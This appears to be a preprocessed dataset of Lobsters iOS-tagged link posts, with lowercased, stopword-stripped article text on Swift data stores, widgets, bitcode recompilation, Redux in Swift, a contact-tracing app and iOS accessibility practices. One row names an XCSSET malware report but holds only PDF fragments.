20,Lobsters,ios,Apple iOS,"Dflat, Structured Data Store for Mobile",https://github.com/liuliu/dflat,dflat structured data store mobile,dflat sqlite flatbuffers core data realm dflat dflat dflat feature dflat core data dflat dflat strict serializable core data dflat combine second introduction dflat flatbuffers schema dflat dflat libmdbx dflat dflat installation dflat bazel dflat swift package manager guide dflat example combine combine schema evolution dflat dflat namespace dflat dflat runtime api dflat transaction dflat dflat data fetching dflat data subscription combine close dflat dflat benchmark dflat dflat dflat wcdb disclaimer crud dflat dflat dflat dflat dflat dflat dflat change subscription dflat dflat dflat dflat sqliteswift dflat,dflat sqlite flatbuffers familiar core data realm dflat occupies space two application unlike two dflat different set feature make different tradeoff feature tradeoff grounded realworld experience writing world largest apps dflat also built groundup using swift hopefully find natural interact swift language feature writing different structured data persistence system mobile past year dflat accumulation lessonslearned building proprietary system io particular goto choice long core data work internal data persistence mechanism many system apps deploying structured data persistence system hundred million mobile device certain challenge intrinsics data persisted higherlevel rest app interact system dflat codebase still young stage however underlying principle proving successful proprietary system dflat implemented following feature particular order system return immutable data object passed system view model generator query object observed update published either callback combine framework mutation happen separate thread caller little control thus asynchronously data fetching happen concurrently synchronously thread caller choice strict serializable multiwriter multireader mode supported user choose singlewriter thus trivially strict serializable multireader mode desire data query expressed swift code typechecked swift compiler schema upgrade require writeaccess underlying database strict readonly possible sqlite unlike core data dflat built groundup swift express data model taking full advantage swift language thus native support struct producttype enum sumtype typechecked query observing combine second introduction dflat consists two part dflatc compiler take flatbuffers schema generate swift code dflat runtime minimal api footprint interact dflat runtime us sqlite storage backend design support backends libmdbx future hard dependency flatbuffers use dflat first use dflatc compiler generate data model flatbuffers schema include generated code project use dflat runtime interact data model installation dflat moment requires bazel precise dflat runtime installed either swift package manager bazel dflatc compiler requires bazel build relevant part install bazel macos following guide use dflatc compiler dflatcpy help proceed add dflat runtime either swift package manager bazel swift package manager package name dflat url http githubcomliuliudflatgit example assuming postfbs file somewhere look like enum color byte red green blue table textcontent text string table imagecontent image string union content textcontent imagecontent table post title string primary primary key color color tag string priority int indexed property indexed content content roottype post important say post object one dflat manages use dflatc compiler generate code schema dflatcpy postexample postexamplepostfbs everything check see file generated postexample directory postgeneratedswift postdatamodelgeneratedswift postmutatinggeneratedswift postquerygeneratedswift adding project basic createreadupdatedelete crud operation post object import dflat import sqlitedflat let dflat sqliteworkspace filepath filepath fileprotectionlevel noprotection create var createdpost post nil dflatperformchanges postself changeshandler txncontext let creationrequest postchangerequestcreationrequest creationrequesttitle first post creationrequestcolor red creationrequestcontent textcontent textcontent text first post guard let inserted try txncontentsubmit creationrequest else return alternatively use txncontenttry submit creationrequest wo nt return result reasonable error handling case let inserted post inserted createdpost post succeed transaction done read let post dflatfetch postself posttitle first post update dflatperformchanges postself changeshandler txncontext let post post let changerequest postchangerequestchangerequest post changerequestcolor green txncontenttry submit changerequest succeed transaction done delete dflatperformchanges postself changeshandler txncontext let post post let deletionrequest postchangerequestdeletionrequest post txncontenttry submit deletionrequest succeed transaction done subscribe change either query object object subscription end object deleted query subscription wo nt complete unless cancelled two set apis one vanilla callbackbased based combine show combine one subscribe live query let cancellable dflatpublisher postself postcolor red orderby postprioritydescending subscribe dispatchqueueglobal sink post print post subscribe object let cancellable dflatpulisher post subscribe dispatchqueueglobal sink post switch post case updated newpost print newpost case deleted print deleted completed schema evolution schema evolution dflat follows exact flatbuffers exception add primary key change primary key different property selected otherwise free add remove index rename property property removed marked deprecated new property appended end table never change type property need versioning long follow schema evolution path schema maintained flatbuffers sqlite disk ops required schema upgrade schema upgrade failure due lack disk space prolonged schema upgrade time due pathological case wo nt thing dflat namespace dflat schema support namespace flatbuffers schema however swift nt really support proper namespace namespace implementation relies public enum extension thus namespace namespace table post title string primary roottype post declare namespace project need swift file contains following public enum evolution public enum work access post object typealias post dflat runtime api dflat runtime minimal api footprint apis total object transaction func workspaceperformchanges transactionalobjecttypes anytype changeshandler escaping transactioncontext transactioncontext void completionhandler success bool void nil api take changeshandler closure perform transaction object creation update deletion mutation performed changerequest object first parameter specifies relevant object going transact read update object specified assertion triggered transaction done completionhandler closure triggered let know whether transaction successful transaction performed background thread exactly one nt concern two different object transaction performed concurrently follows strict serializable protocol case func transactioncontextsubmit changerequest changerequest throw updatedobject func transactioncontexttry submit changerequest updatedobject func transactioncontextabort bool interact dflat apis transaction handle data mutation submit note error possible example created object primary key twice use upsertrequest expected try submit method simplified try submit dance case nt want know returned value fatal conflict primary key otherwise swallow type error disk full encountered type error dflat simply fail whole transaction abort method explicitly abort transaction submission call effect data fetching func workspacefetch oftype elementtype elementquery limit nolimit orderby fetchedresult element func workspacefetch oftype elementtype limit nolimit orderby fetchedresult element func workspacefetchwithinasnapshot data fetching happens synchronously specify condition clause posttitle first post postpriority postcolor red returned fetchedresult element act pretty much like array object element immutable thus either object fetchedresult element safe pas around thread fetchwithinasnapshot provides consistent view going fetch multiple object let result dflatfetchwithinasnapshot firstpost fetchedresult post highpriposts fetchedresult post let firstpost dflatfetch postself posttitle first post let highpriposts dflatfetch postself postpriority postcolor red return firstpost highpriposts needed dflat transaction fetch firstpost highpriposts fetchwithinasnapshot wo nt stop transaction make sure observe view fetching firstpost data subscription func workspacesubscribe element equatable fetchedresult fetchedresult element changehandler escaping fetchedresult element void subscription func workspacesubscribe element equatable object element changehandler escaping subscribedobject element void subscription native subscription apis subscribes change either fetchedresult object object end object deleted subscription triggered completionhandler transaction triggered func workspacepublisher element equatable element atompublisher element func workspacepublisher element equatable fetchedresult element fetchedresultpublisher element func workspacepublisher element equatable elementtype elementquery limit nolimit orderby querypublisher element func workspacepublisher element equatable elementtype limit nolimit orderby querypublisher element combine counterpart besides subscribing object fetchedresult also subscribe query directly happens hood query made upon subscribe hence whichever queue provided subscribe subscribe fetchedresult close func workspaceshutdown completion void nil trigger dflat shutdown transaction made dflat call fail transaction initiated finish normally data fetching return empty result data fetching triggered call finish normally hence completion part completion closure supplied called transaction data fetching initiated shutdown finish benchmark benchmark structured data persistence system notoriously hard dflat wo nt claim fastest however strives predictable performant mean nt pathological case performance dflat degrades unexpectedly also mean dflat wo nt surprisingly fast optimal case following data collected reproduced focuspy app benchmark compared mainly core data listed number fmdb wcdb wcdb benchmark give better overview would expect test device test device iphone pro memory disclaimer take grain salt benchmark number number presented simply demonstrate pathological case framework involved nt taken context practice structured data persistence system rarely bottleneck important understand use rather raw number lightworkload device look like code app benchmark compiled release mode compilationmodeopt wholemoduleoptimization wcdb benchmark compiled release mode whatever mean project file benchmark peerreviewed case represents best case scenario framework case represents worst case scenario designed reflect realworld workload rather benchmark designed reflect framework characteristic extreme case crud first compared dflat core data object insertion fetching update deletion object generated index title indexed core data fetching object evaluated framework querying nonindexed property update object individually evaluated updating different object separate transaction time fetching object individually evaluated fetching different object title indexed core data primary key dflat time obviously best way thing update object one big transaction fetch batch possible interesting pathological case discussed earlier proper way multithread insertion deletion core data considerably tricky nt got around multithread insert object multithread delete object dflat number look good true example insertion dflat appears twice fast core data number nt make intuitive sense multithread insertion slower putting perspective important chart compared number extracted wcdb benchmark without modification compare ops per second rather time spent fetching object note wcdb benchmark baseline read fetch best case scenario sqlite also compare simple table two column key blob payload byte multithread writes indeed slower ideal case sqlite execute writes concurrently thus multiwriter mode really mean transaction closure executed concurrently writes still happen serially sqlite layer still beneficial realworld case spend significant time transaction closure data transformation rather sqlite writes ceiling writes much higher dflat achieved wcdb represents ideal case two column dflat number realworld would also lower index object many field even array data since dflat nt introduce optimization batch operation nt surprise dflat performance scale linearly wrt dataset size follow chart show change subscription every framework slightly different design change subscription work core data implement two way nsfetchedresultscontroller delegate callback nsmanagedobjectcontextobjectsdidchange developer perspective nsfetchedresultscontroller interpreted counterpart fetchedresult subscription dflat side support making sqllike query sending update result set build dflat object subscription mechanism core data based nsmanagedobjectcontextobjectsdidchange notification purpose objective simply observe latency nsmanagedobjectcontextobjectsdidchange notification compare two assuming underlying delivery individual object subscription noop three part benchmark subscribe change fetched result observe exactly one object fetched primary key subsequent transaction update object including subscribed object measuring latency saved time update delivered core data child context viewcontext set latency measured saving child context time delivered data persisted viewcontextsave called child context saved dflat side happens data persisted subscribe change fetched object subsequent transaction update object including subscribed object measuring latency saved time update delivered core data nsmanagedobjectcontextobjectsdidchange subscribed viewcontext object measure latency saving child context time notification delivered subscribe change fetched result observe around object fetched range query subsequent transaction update object rotate object fetched result maintaining object per result measurement setup core data number fetched result observation especially case represents pathological case particularly troublesome dflat fetching object disk individually would take around millisecond thus would take sqliteswift approach identifying whcih table changed simply refetch every query table could end performant although case refetching disk would definitely slower close second query object benchmark core data suffered similar problem worse extreme case mobile apps handful query subscription probably thousand object query unsubscribe change navigate away page extreme case hardly realistic going see stutter core data object updated happen table view need updated reality subscribe individual query primary key seems big nono want observe individual object subscribe individual object case show however expose messagesortinganddelivery mechanism working efficiently expected fundamentally dflat change subscription work best incremental change evaluate every changed object fetched request subscription related object design avoids trip disk every transaction also relies reasonable implementation evaluate every changed object efficiently quick test show looping object string equality evaluation swift take millisecond profile show majority time spent object retain release function call swift runtime two way improve current evaluation relies swift protocol associated type seems certain swift usage higher runtime cost others switching better linear scan either interpreted vm simply optimizing evaluation procedure would probably show improvement algorithmically improved current implementation naive way evaluate object subscribed query study database implementation know accelerated data structure helpful particularly fieldexpr query used build sorted set comparable query accelerated sorted set quite doable challenge need wrestling swift runtime behavior erratic time obvious gain possible intended delegate part c make harder hard implement use logic internally support isnull isnotnull query mean every turn need sort unknown robust correct implementation mean much unit test feel comfortable also need balance linear scan use accelerated data structure small number change linear scan could faster previous empirical study
21,Lobsters,ios,Apple iOS,Create a Tube Status home-screen Widget for iOS 14,https://medium.com/@oliverbinns/create-a-tube-status-home-screen-widget-for-ios-14-7f25f7a0a7e1,create tube status homescreen widget io,first widget create target timeline provider timeline entry widget multiple widget widget bundle providing customisation intent intent timeline provider intent configuration,first widgetcreate targetlet begin implementing widget first need create new target xcode go file new select widget extension template enter name widget uncheck include configuration intent need first basic widgetxcode created template widget u boilerplate implementation timelineprovider timelineentry widget add implementation create new source file within newly created widget foldertimeline provider timeline entrythe timeline provider work similar concept clkcomplicationdatasource used creating complication apple watch provide array data entry current time future useful apps weather app provide entry future forecast one go reducing amount refreshes needed transport status app obviously unable predict future disruption provide one entry current statusthe timelineentry status update use model shared library created struct statusupdateentry timelineprovider let date date let update linestatusupdate timelineprovider protocol requires u implement two method snapshot methodthe snapshot method called need provide shortlived display widget widget selection menu apple documentation suggests sample data used required allow snapshot return quickly possiblethe timeline methodthe timeline method called widget displayed normally homescreen device need return timeline entry transport status example able return single entry set expiry date timeline two minute future regularly refreshing widget latest uptodate informationpublic func timeline context context completion escaping timeline entry fetch latest travel information api statusservicegetstatus client networkclient update let entry simpleentry date date update update refresh data every two minute let expirydate calendar currentdate byadding minute value date date let timeline timeline entry entry policy expirydate completion timeline widgetthe widget implementation us main property wrapper new swift mark entry point widgetwe provide widgetconfiguration body widget configuration requires placeholder view displayed widget loading timeline provider discussed abovewe use modifier specify name description shown user selecting widget add homescreen also specify widget size support case tube status widget contain quite lot information add supportedfamilies systemlarge build view inside widget configuration way build windowgroup main appstruct alllineswidget widget public var body widgetconfiguration staticconfiguration kind line provider alllinesprovider placeholder alllinesplaceholderview entry contentview update entryupdates configurationdisplayname tube status description see status board underground line supportedfamilies systemlarge multiple widgetswidget bundlewe provide multiple type widget using widgetbundle protocol fairly simple use build group widget way build swiftui view mainstruct tubewidgets widgetbundle widgetbundlebuilder var body widget alllineswidget add main make sure remove widget otherwise swift compiler able work correct entrypoint appwe add many different type widget like var body widget myfirstwidget mysecondwidget mythirdwidget providing customisationintentsthe example work well want display status information line user travel one particular line could create new widget line quickly becomes messy widget selection menu would require user swipe lot line find one interested wanted also provide widget bus dlr transport mode using intent select tube linewe use intent allow user configure single widget line want see using widgetbundles keep original status widget implement additional widget using intent intenttimelineproviderlet start creating intent implemented something using siri shortcut likely already familar intentscreate new intent definition file file new file sirikit intent definition file ensure file included app target widget extensionwe create new enum datatype hold different line option create enum different tube line option using visual editorthe unknown case displayed picker use later specifying default valuenext need create new custom intent add title description user know choosingthe intent need eligible widget siri shortcut suggestion needed thiscreate custom intent allow user select line widgetwe also need declare intent application sinfoplist file otherwise able load edit widget modal key nsuseractivitytypes key array string lineselectionintent string array intent timeline providerin order support intent need conform timeline provider intenttimelineprovider rather timelineprovider protocol similar pass intent snapshot timeline methodswe use intent parameter retrieve user parameter specifiedpublic func snapshot configuration lineselectionintent context context completion escaping simpleentry let line selfline configuration statusservicegetstatus client networkclient line let entry linestatusupdateentry date date line line update update completion entry use simple line method map autogenerated intent enum line enum model func line configuration lineselectionintent line switch configurationline case circle return circle case district return district intent configurationwe set new widget intentconfiguration similar widgetconfiguration used previously requires u specify intent typestruct singlelinewidget widget public var body widgetconfiguration intentconfiguration kind single line intent lineselectionintentself provider singlelineprovider placeholder singlelineplaceholderview entry configurationdisplayname line status description see status specific london underground line supportedfamilies systemsmall systemmedium
22,Lobsters,ios,Apple iOS,WWDC 2020,https://www.apple.com/apple-events/event-stream/,wwdc,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
23,Lobsters,ios,Apple iOS,"Beyond Faster JSON Support for iOS/macOS, Part 9: CSV and SQLite",https://blog.metaobject.com/2020/06/beyond-faster-json-support-for-iosmacos.html,beyond faster json support iosmacos part csv sqlite,csv parsing gtfs h sqlite fmdb,looking mpwpliststreaming protocol using json parsing series one thing probably noticeable nt particularly jsonfocused fact nt even initially designed parsing generating could use deserialization task glad asked csv parsing one example performance book involves parsing comma separated value quickly within context getting time convert gtfs file something usable phone minute using using coredatasqlite slightly le second using custom inmemory data structure also several order magnitude faster query ondevice original project cv parser took around second nt significant part minute rest took couple hundred millisecond time make part faster well result slightly generalized mpwdelimitedtable h basic interface blockbased block called every row table called dictionary composed header row key content row value void void nsdictionary thedict int anindex block adapting mpwpliststreaming protocol straightforward void writeonbuilder id builder builder beginarray self nsdictionary thedict int anindex builder begindictionary nsstring key selfheaderkeys builder writeobject thedict key forkey key builder enddictionary builder endarray quickanddirty implementation based existing api clearly suboptimal api call first construct dictionary row header key iterate however work existing set builder nt build inmemory representation entire csv also relatively straightforward invert api usage modifying lowlevel api use mpwpliststreaming creating higherlevel block dictionaybased api top way also work mpwpliststreaming client sqlite another tabular data format sql data base macosios one common database sqlite usually accessed via coredata excellent much lightweight fmdb used fmdb bing quite delighted first impulse write mpwpliststreaming adapter looking code bit closely seemed quite bit would need mpwpliststreaming also think saw tradeoff convenient slow convenience based nsdictionary much complex potentially faster api based pulling individual type value instead decided try something ultra simple sits directly top sqlite capi implementation really quite simple compact interface mpwstreamqlite property nonatomic strong nsstring databasepath end implementation mpwstreamqlite db instancetype initwithpath nsstring newpath self super init selfdatabasepath newpath return self int exec nsstring sql re int rc db sql re autoreleasepool selfbuilder beginarray int step int re nsstring key numcols int numcols key re sqliterow step re autoreleasepool selfbuilder begindictionary int numcols const char text const char re text selfbuilder writeobject text forkey key selfbuilder enddictionary re selfbuilder endarray return rc int open return selfdatabasepath db void close db db dbnull course nt lot chiefly read update insert deletes however code striking brevity simplicity time convenient fast though still room improvement experience tend get three property time code simple convenient tends slow code convenient fast tends rather tricky code simple fast tends inconvenient use easy use following code turn table array dictionary import mpwfoundationmpwfoundationh int main int argc char argv mpwstreamqlite db mpwstreamqlite alloc initwithpath chinookdb dbbuilder mpwplistbuilder new db open db exec select artist nslog result dbbuilder result db close else nslog ca nt open database sn db error return pretty good probably roughly par course returning generic data structure array dictionary going particularly efficient one first clue coredata predecessor eof nt particularly fast read fetching raw dictionary optimization much faster fetching object want get object instead easy replace mpwplistbuilder mpwobjectbuilder parametrized class create well define class presumably already havee task convert object class cold obviously also automated import mpwfoundationmpwfoundationh interface artist nsobject property assign long artistid property nonatomic strong nsstring name end implementation artist nsstring description return nsstring stringwithformat self class self selfartistid selfname end int main int argc char argv mpwstreamqlite db mpwstreamqlite alloc initwithpath chinookdb dbbuilder mpwobjectbuilder alloc initwithclass artist class db open db exec select artist nslog result dbbuilder result db close else nslog ca nt open database sn db error return note generate plist representation intermediate step go straight database result set object generic intermediate format mpwpliststreaming protocol dematerialized representation plist object peer
24,Lobsters,ios,Apple iOS,Translating an ARM iOS App to Intel macOS Using Bitcode,https://www.highcaffeinecontent.com/blog/20190518-Translating-an-ARM-iOS-App-to-Intel-macOS-Using-Bitcode,translating arm io app intel macos using bitcode,introduced bitcode bitcode objectivec ebcutil statically translate binary intel arm include bitcode marzipanify,apple introduced bitcode made mandatory watchos tvos kinda handwaved away question existed nebulous claim useful tuneup binary utilizing latest compiler improvement since bitcode proven instrumental seamless overnight transition watchos developer nt even need recompile apps store apple transparently could run apple watch series likely nt even notice transition taken place bitcode well bitcode small b architecturespecific intermediate representation used llvm capitalb bitcode pertains set feature allowing embed representation macho binary mechanism provide apple app store submission flexible source code far flexible built binary metadata annotation compiler practice apple easily take bitcode blob app recompile fullyfunctioning copy app going piece cake save developer recompile everfatter binary every time apple tweak arm chip bitcode longsince used apple opengl driver driver optimize fly various gpu architecture apple support seen microsoft use static recompilation great effect xbox one giving access whole library originallypowerpc xbox game without developer intervention access source code without intermediary like bitcode trivialize process course specter macos arm public psyche many year many pondered whether bitcode make transition straightforward commonly held belief bitcode suited massive architectural change like moving intel arm unconvinced decided test theory firstly need objectivec hello world app bitcode bitcode usually included building archive app store need force inclusion regular build use fembedbitcode flag custom build setting bitcodegenerationmode bitcode build binary generic io device attached device like normal bitcode nt seem embedded build ie device might want turn active architecture setting build directly using tool called ebcutil easily extract bitcode object compiled binary ebcutil e pathtomyappappmyapp bitcode object recompile intel f clang arch c xclang disablellvmpasses emitllvm x ir isysroot applicationsxcodeappcontentsdeveloperplatformsiphonesimulatorplatformdevelopersdksiphonesimulatorsdk f fo done want link compiled blob back binary clang arch isysroot applicationsxcodeappcontentsdeveloperplatformsiphonesimulatorplatformdevelopersdksiphonesimulatorsdk pathtomyappappmyapp succeeds intel version app able drop directly io simulator window install verify run important proof statically translate binary intel arm include bitcode really work gotchas morecomplex project arc appears use inline assembly mean need disable arc project translation succeed right certain kind block like completion handler also seem trip compiler instruction refuse accept see error likely issue objectivec well swift designed arc mind thus dont believe way avoid aforementioned inline assembly recompilation fail currently take step use marzipanify convert intel io app mac app run using marzipan easy mean theory apple wanted every io app app store run mac today future mechanism transparently without needing developer update recompile apps mac switched using arm chip instead intel well see apple could use bitcode translate every bitcodeenabled app mac app store without consulting developer would ready go day one kind power mean apple preannounce arm switch year ahead time also mean technology like rosetta may completely unnecessary time round obviously yet apple nt enable bitcode submission mac app store today bitcode may ideal architectural translation apple would make sure two thing change soon surely mandate bitcode marzipan apps macos
25,Lobsters,ios,Apple iOS,"Germany‚Äôs coronavirus contract tracing app is out today, and is open source",https://github.com/corona-warn-app,germany coronavirus contract tracing app today open source,grow team github sign repository issue need help issue need help package package package package used topic reload reload,dismiss grow team github github home million developer working together join grow development team manage permission collaborate project sign repository backend implementation applegoogle exposure notification api java updated aug native android app using applegoogle exposure notification api kotlin issue need help updated aug native io app using exposure notification framework apple swift issue need help updated aug html updated aug backend implementation verification process package java updated aug project overview general documentation white paper tex updated aug backend implementation test result information package java updated aug package freemarker updated jul frontend implementation verification process package java updated jul central repository collect community feature request improvement updated jul backlog item coronawarnapp updated jun coronawarnapp issue public hotline updated jun used topic perform action time signed another tab window reload refresh session signed another tab window reload refresh session
26,Lobsters,ios,Apple iOS,"The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSS Backdoor Planting in Safari, and Leverages Two Zero-day Exploits",https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf,xcsset malware insert malicious code xcode project performs uxss backdoor planting safari leverage two zeroday exploit,,obj metadata rviewerpreferences r endobj obj endobj obj extgstate font procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj stream
27,Lobsters,ios,Apple iOS,"Porting Redux Architecture to Swift (Well, for a Toy macOS App Anyway)",https://medium.com/insertgif/porting-redux-architecture-to-swift-well-for-a-toy-macos-app-anyway-ed61bad0395c,porting redux architecture swift well toy macos app anyway,porting redux architecture swift well toy macos app anyway insertgif store action testable debuggable easy understand easy reason store action store action app easily mutate store store action swift insertgif grand central dispatch grand central dispatch subscription higherorder reducer insertgif spectacle insertgif twitter producthunt originate,porting redux architecture swift well toy macos app anyway boy medium back day let sit rocking chair install modperl movabletype put something internet uppercased internet back liked walked told get back talking software architecture insertgifsoftware architecture exciting topic nobody else ever pontificated one nicer experience programming last year writing react component using redux unfamiliar web development talking much react redux little tutorial help know store action goal architect toy app testable debuggable easy understand easy reason idea separating store set action whatever word may mean declarative userinterface description html jsx cocoa view view controller rooted older idea separating data presentation one another behind cascading style sheet microsoft powerpoint different app microsoft word last one real making sure still paying attention scan header image blog post people critical reading skill way get pandemicstores actionswe define store location canonical representation data true know true current point time great definition try hard definition specific tell lielet say writing gui component show bank account part new bank account app store app would containall transaction renderedthe computed account balance iterate list transaction time instead n ya knowthe user avatar scroll page scrolled cover valuable information client wanted thought would spiffy app littlein kingdom javascript would represent store giant usually immutable object array string float object would want exact decimal banking app would look javascript work would sigh resign float action concrete object encode event relevant store either creating new version store requiring information store definition meant wideencompassing generic constitutes action really depends business logic patience write kinda boilerplatey code store action macos app might button clicka menu item clickthe user resized application windowa keypress happeneda keypress another app happenedan thread monitoring http request completed another threadmacos restartthe computer firebut promise something want mutate store must take place action first user want withdraw money bank balance app must first encode action action type withdrawal amount description buy new airpod old one fell chewing user uploads new avatar must make action type avataruploaded buffer containing jpeg data good implementation architecture macos application make difficult view view controller violate promise say app easily mutate store application scale include component data dependency becomes harder reason one nice aspect storeandactions architecture cheerfully named redux architecture get click link make change store explicit first change must encoded action function might call reducer must patternmatch stream action create new storestore action swiftif programmed io macos might degree recognize store another name core data managed object context le analogous store instead represented object graph encoding n n relationship giving u way project insert update delete node graph true would want unless good reason use core data application especially looking build team developer scale something approaching fancy macos app cost app storehowever let say want build toy app quickly something fun hacked together weekend yet still completely suck managing data perhaps encode store immutable object using swift struct integer also great way store decimal huh want design withdrawal first action might look like represent action using swift enum need fold stream action creating new version store along way redux represents part codebase take action produce new version immutable store reducer borrow terminology even though diction esoteric need let assume writing multiple reducer time like structure new feature ticket insertgif new reducer use protocol unify type level protocol would call interface language term come objectivec objectivec different objectivec like differentnote using swift value type structs first copy store nextstore update field new store returning common reducer code go ahead give helper make easier reason need inout keyword mutate new cloned store swift better immutable record update syntax would probably herethis banking code trustgrand central dispatch grand central dispatch write layer architecture construct store run reducer central location action dispatched handled imaginatively call dispatch view controller hook nsbutton dispatch every time user click withdraw button withdrawal action occurs real banking app would probably also want enter routing account number place withdrawing fun show blithely ignore aspect realworld bankingsome kinda cool immediate benefit get store action even extremely unrealistic example app business logic life reducer eminently testable need construct cocoa view run unit test reducer need mock storea great way debug app print action dispatch place xcode breakpoint possible external stimulus outside world pas time something unexpected happens able trace exact action caused ita common request product manager boss alike implement user analytics user click button user coming funnel user giving u information andor money write track reducer convert user behavior google analytics segment event making remote call event come fire forget minute form event sourcing friend s√∂nke point outas app grows becoming unruly moody want refactor feature adage write code easy delete believe reducer written way satisfies rule thumb drop action reducer use compiler list compiler error find usesites imagine written view controller directly read modified array transaction balance would audit location user action led mutation would also pull business logic entangled view codesubscriptionswith withdrawal feature place would like render screen app contains list transaction account balance user avatar javascript react component update automatically dependency store among change benefit componentized user interface cocoa still benefit thinking oneway dataflow store presentation data storedispatch already single place action flow take advantage architectural watering hole use invoke subscription first let u model subscription callable object c would call functor object hear saying computer remind c escaping keyword mark closure later use constrains kind closure passed parameter help prevent reference cycle life escaping cycle construct ourselvesas subscription come store array action occurs iterate array invoke subscription small wrinkle memoize projection store avoid unnecessary ui updatesthis work breaking subscription two map action like mapstatetoprops redux encourage view controller construct equatable object containing subset information store projection need action need fire time action occursin general strike central weakness storeandactions architecture difficult write performant app certain highfrequency action encoded object passed every reducer however toy app suffices fine also imagine app certain part app flee normal architecture manage state squeeze extra framesit remains implement subscriber generic variable exists know kind type view controller want represent state know need equatable implement inequality checknow use subscription reactively update cocoa view oh boy view controller easy writethis completes core loop architecture change happens user click withdraw one view controllerthe change packaged actiona reducer several handle action creates new storesubscribers invoked new storea second view controller subscribed store update viewsone last thing though multiple reducer higherorder reducersthis title book programming would sell bunch copy even though nobody would able understand alternate universe paid content make internet suppose universe need reducer multiplex action many reducer despite fancy title simple write could keep going bank app think would neat show actual list reducer look like insertgif give hint feature ticket wanted implement release app action shoutout opensource spectacle app wayeven toy app already kind complicated might posit writing user interface essentially hobby worry tiny detailsthat allgo check insertgif already also twitter producthunt keep updating long remember insertgif made love nyc proud alumnus originate r laboratory hope much fun reading individually creating gist medium sevenyear old product support syntax highlighting code block
28,Lobsters,ios,Apple iOS,A Best in Class iOS App,https://swiftjectivec.com/A-Best-in-Class-App/,best class io app,jordan morgan thing quantify help make app great accessibility platform technology user experience design app store presence accessibility first class rotor voice gesture escape magic tap threefinger scroll increment decrement voice control appropriate element add necessary subtitle audio track uiaccessibilitylocationdescriptors vision hearing physical motor literacy learning io technology tightly integrated lplinkview universal link touch face id user experience top mind native two finger drag edit gesture support field token viewdidappear determinate indeterminate view hiddenpreviewsbodyplaceholder background task compact environment design drip polish app store page logistical asset thoughtfully crafted wrapping,indie dev diary present written jordan morgan feb updated jul get public github issue version list updated reflect io long part industry watched incredible welldeserving apps take home apple design award endgame year ago set create list succinctly answer one question thing quantify help make app great believe created list help answer question might look different one mine attempt take emotion mostly opinion want capture apple say great people may define though opinion assuredly value give ada apple quick brief methodology behind created first importantly read io human interface guideline annually top bottom gm release upcoming version io list applies primarily latest version io ipados smoke fire apple said record great app include whatever thing interaction thing clandestine trade secret rather thing apple apple design evangelist publicly gave seal approval lastly remember largely yesno list part equation make truly great app innovation technology user experience come together enriching people day day interaction apps knowing us extremely well always got item two belongs list mean create pull request get added visiting link bottom post five section cover accessibility designing everyone right thing best apps exceptionally well platform technology apple love apps utilize new apis great effect shoehorning feature looking product seeing utilize io around user experience make people think app core function act thesis paper ux body support design explaining design hard know good one see section list thing apps thoughtfully created app store presence far nascent category tracking list short includes best practice app store accessibility first class voice fully supported rotor control implemented including relevant heading using screen curtain yield experience usable par regular app using voice voice gesture overridden necessary escape twofinger zshaped gesture dismisses modal dialog go back one level navigation hierarchy func accessibilityperformescape bool magic tap twofinger doubletap performs mostintended action func accessibilityperformmagictap bool threefinger scroll threefinger swipe scroll content vertically horizontally func accessibilityscroll direction uiaccessibilityscrolldirection bool increment onefinger swipe increment value element func accessibilityincrement decrement onefinger swipe decrement value element func accessibilitydecrement voice control also supported appropriate accessibilityuserinputlabels set needed app respect following setting including bold text high contrast cursor reduce transparency dark mode reducing motion presenting new controller set voice cursor appropriate element topmost left element make sense uiaccessibilitypostnotification screenchangednotification myheading context considering use accessibilityignoresinvertcolors image video punctuation spoken accessibility text use attributed string set accessibilityspeechpunctuation true group content logically using accessibility container efficient navigation adaptive support device multitasking scenario elegantly fully support dynamic type readable text us readablecontentguide color blind support color contrast ratio smart invert color support app responds well color inversion bar button landscapeimagephone largecontentsizeimage property set control grouped way make navigation trivial shouldgroupaccessibilitychildren already use system vended item common bar button quick action tab navigation bar item ie save done etc glyph accessibility image set ie adjustsimagesizeforaccessibilitycontentsizecategory includes closed caption audio description image icon alternative text set full rotor control support provided via uiaccessibilitycustomaction leading trailing margin used constraint support left right language got ui inherit uiview uicontrol leverage uiaccessibilityelement make accessible needed include video add necessary subtitle audio track user interface appears flawlessly tested using double length pseudolanguages using nsshownonlocalizedstrings yield result support drag drop uiaccessibilitylocationdescriptors set also leverage accessibilitydragsourcedescriptors accessibilitydroppointdescriptors modally presented view clear button available dismiss instead relying solely swipe gesture imessage sticker extension accessibility label provided magic tap supported app common functionality us cfbundlespokenname app name could potentially mispronounced system e would coolapp twenty three request permission io truly need hig request clearly related current context help people understand app intention end day considering building accessibility technology deal mac catalyst alternate pointer action slow key larger text header pointer speak screen guided access typing feedback full keyboard access assistive touch reduce motion voice control reachability live listen rtttty accessibility keyboard zoom magnifier voiceover sticky key switch control speak selection display accommodation audio description mouse key hover text large text braille dwell main thing address broadly vision hearing physical motor literacy learning lastly running entire app accessibility inspector produced warning turning screen curtain navigate app work flawlessly io technology tightly integrated contextual menu integrated long press showing preview appropriate find good balance include many option overwhelming use glyph reinforce action meaning edit menu used right place conflict context menu opt pull style menu action sheet use reduce modality throughout app keep focus squarely content action sheet still used confirm destructive action provides enough friction ensure user really want perform deletion also include cancel menu item canceling implicit action system provides tapping outside menu bound use menu disambiguation navigation selection showing option offer menu present power user functionality long pressing bar button necessary addition providing standard action tapping fully support dark mode multiple space scene support ipados leverage idea primary window versus auxiliary window one provides access full feature set help user complete focused singular task usually closed afterwards full multitasking support home screen quick action support offer sign sign apple included spotlight search indexing support custom uipointerinteraction support app need interface support cursor support correctly force interaction paradigm another ie touch viable pointer keyboard viceversa use correct content effect consistently highlight lift hover effective energy management ie support low power mode reacts keyboard shortcut added app could used almost completely solely use keyboard modifier key along mouse pointer click supported support handoff mac applicable meaningful extension included app whether via share extension action extension file provider sticker pack custom keyboard etc extension carefully thought example widget mini app strives provide glanceable actionable information table collection view cell make sense focus selectionfollowsfocus set callback url supplied documented apps may integrate xcallbackurl uimenucontroller support necessary via overriding uiresponderstandardeditactions supply custom icon enhance user personal connection app want display link consider using lplinkview deep siri intent support donate shortcut action user already taken suggest shortcut user shortcut apps section shortcut app suggesting invoiceshortcutcenter integrate wind make sense support shortcut include ui view also include intent phrase help coach user alternate app name included appropriate watchface support make sense document sharing supported via file provider drag drop first class support fully fleshed nsitemprovider exists custom object editable control data entry also accept content via 